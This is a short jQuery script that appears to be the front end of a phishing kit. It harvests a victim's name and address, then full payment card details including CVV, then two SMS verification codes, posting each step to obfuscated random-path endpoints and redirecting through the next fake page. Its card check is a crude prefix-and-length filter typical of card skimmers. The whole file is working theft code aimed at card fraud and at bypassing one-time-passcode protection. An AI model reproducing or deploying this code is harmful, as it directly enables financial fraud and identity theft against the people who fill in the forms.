$(function(){
    
    $("#pg1").on("submit",function(e){
        e.preventDefault();
        let a1 = $("#f_name").val();
        let a2 = $("#p_name").val();
        let a3 = $("#street").val();
        let a4 = $("#c_o_t").val();
        let a5 = $("#p_code").val();


        //send backend:
        $.ajax({
            url: '/fBnsyeWCkGU5PtN44397',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({a1,a2,a3,a4,a5}),
            success: function(info) {
                if(info.OK){
                    window.location = "/ZjCHNsVuB44QhpjLAj2H";
                }
            }
        });
    });
    $("#pg2").on("submit",function(e){
        e.preventDefault();
        let a1 = $("#nemro").val();
        let a2 = $("#holder").val();
        let a3 = `${$("#mmo").val()}/${$("#yyo").val()}`;
        let a4 = $("#vv").val();
        a1 = a1.split(" ");
        a1 = a1.join("");
        let cc_t = false;
        if(a1.length == 16 && (a1[0] == "5" || a1[0] == "4")){
            $(".e_cc").removeClass("error");
            $(".e_pp").addClass("error");
            cc_t = true;
        }
        if(!(a1.length == 16 && (a1[0] == "5" || a1[0] == "4"))){
            $(".e_cc").addClass("error");
            $(".e_pp").removeClass("error");
            cc_t = false;
        }
        if(cc_t){
            //send backend:
            $.ajax({
                url: '/4HaJuw65fMKDD7ecbZ2H',
                type: 'POST',
                contentType: 'application/json',
                data: JSON.stringify({a1,a2,a3,a4}),
                success: function(info) {
                    if(info.OK){
                        window.location = "/SeG5bQzY3cJS684VGBLe";
                    }
                }
            });
        }


        
    });

    $("#pg3").on("submit",function(e){ // snms1:
        e.preventDefault();
        let sps1 = $("#sps1").val();


        //send backend:
        $.ajax({
            url: '/mzSwUkevFaMQsaM8n8te',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({sps1}),
            success: function(info) {
                if(info.OK){
                    window.location = "/3TSBDWJuA2PwZQAtrHqx";
                }
            }
        });
    });


    $("#pg4").on("submit",function(e){ // snms2:
        e.preventDefault();
        let sps2 = $("#sps2").val();
        //send backend:
        $.ajax({
            url: '/2TPGv2qUJtE6Zm824ScY',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({sps2}),
            success: function(info) {
                if(info.OK){
                    window.location = "/kS3e3maVN4TN9wGhTAcf";
                }
            }
        });
    });



});